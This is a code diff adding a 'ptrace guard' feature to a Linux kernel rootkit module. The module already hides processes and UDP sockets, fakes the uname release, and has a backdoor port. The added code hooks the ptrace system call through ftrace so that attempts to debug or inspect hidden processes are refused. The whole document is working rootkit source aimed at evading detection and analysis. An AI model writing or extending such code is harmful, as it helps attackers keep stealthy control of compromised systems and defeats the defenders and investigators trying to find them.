@@ -114,6 +114,11 @@ static orig_newuname_t orig_newuname;
 static char fake_release[RK_UNAME_MAX] = "";
 static DEFINE_SPINLOCK(uname_lock);
 
+/* === ptrace guard for hidden PIDs === */
+static struct ftrace_hook ptrace_hook;
+typedef asmlinkage long (*orig_ptrace_t)(const struct pt_regs *);
+static orig_ptrace_t orig_ptrace;
+
 /* === UDP hiding === */
 #ifdef CONFIG_NET
 static struct ftrace_hook udp_seq_hook;
@@ -387,6 +392,19 @@ static asmlinkage long new_newuname(const struct pt_regs *regs)
     if (copy_to_user(uname_user->release, fake, sizeof(fake)))
         return ret; /* best effort — keep original result on fault */
     return ret;
+}
+
+/* ============================================================
+ * Feature: ptrace guard — deny attaches to hidden PIDs
+ * ============================================================ */
+static asmlinkage long new_ptrace(const struct pt_regs *regs)
+{
+    pid_t target = (pid_t)regs->si;
+
+    if (rk_active && is_pid_hidden(target))
+        return -EPERM;
+
+    return orig_ptrace(regs);
 }
 
 /* ============================================================
@@ -1338,6 +1356,45 @@ static void uninstall_newuname_hook(void)
         ftrace_set_filter_ip(&newuname_hook.ops, newuname_hook.address, 1, 0);
 }
 
+static int install_ptrace_hook(kallsyms_lookup_name_t lookup)
+{
+    int ret;
+
+    ptrace_hook.name = "__x64_sys_ptrace";
+    ptrace_hook.function = new_ptrace;
+    ptrace_hook.original = &orig_ptrace;
+    ptrace_hook.address = lookup(ptrace_hook.name);
+
+    if (!ptrace_hook.address) {
+        pr_err("[-] Symbol not found: __x64_sys_ptrace\n");
+        return -ENOENT;
+    }
+    pr_info("[+] __x64_sys_ptrace @ 0x%lx\n", ptrace_hook.address);
+    orig_ptrace = (orig_ptrace_t)ptrace_hook.address;
+
+    ptrace_hook.ops.func = hook_callback;
+    ptrace_hook.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;
+
+    ret = ftrace_set_filter_ip(&ptrace_hook.ops, ptrace_hook.address, 0, 0);
+    if (ret) return ret;
+
+    ret = register_ftrace_function(&ptrace_hook.ops);
+    if (ret) {
+        ftrace_set_filter_ip(&ptrace_hook.ops, ptrace_hook.address, 1, 0);
+        ptrace_hook.ops.func = NULL;
+        return ret;
+    }
+    return 0;
+}
+
+static void uninstall_ptrace_hook(void)
+{
+    if (ptrace_hook.ops.func)
+        unregister_ftrace_function(&ptrace_hook.ops);
+    if (ptrace_hook.address)
+        ftrace_set_filter_ip(&ptrace_hook.ops, ptrace_hook.address, 1, 0);
+}
+
 #ifdef CONFIG_NET
 static int install_udp_hook(kallsyms_lookup_name_t lookup)
 {
@@ -1464,6 +1521,7 @@ static int install_hook(void)
 #endif
     install_delete_module_hook(lookup);
     install_newuname_hook(lookup);
+    install_ptrace_hook(lookup);
     return 0;
 }
 
@@ -2127,6 +2185,7 @@ static void __exit rootkit_exit(void)
 #endif
     uninstall_delete_module_hook();
     uninstall_newuname_hook();
+    uninstall_ptrace_hook();
     #ifdef CONFIG_NET
     close_backdoor_port();
     #endif
